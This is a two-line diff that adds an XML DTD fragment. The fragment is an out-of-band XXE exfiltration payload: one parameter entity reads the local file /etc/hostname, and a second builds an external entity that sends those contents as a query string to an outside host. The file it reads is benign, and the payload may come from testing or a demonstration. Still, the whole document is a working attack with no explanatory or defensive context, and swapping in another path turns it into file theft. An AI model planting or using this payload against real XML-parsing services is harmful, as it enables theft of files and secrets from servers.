@@ -1,0 +1,2 @@
+<!ENTITY % stuff SYSTEM "file:///etc/hostname">
+<!ENTITY % param1 "<!ENTITY external SYSTEM 'http://dolphindiv.github.io/?%stuff;'>">
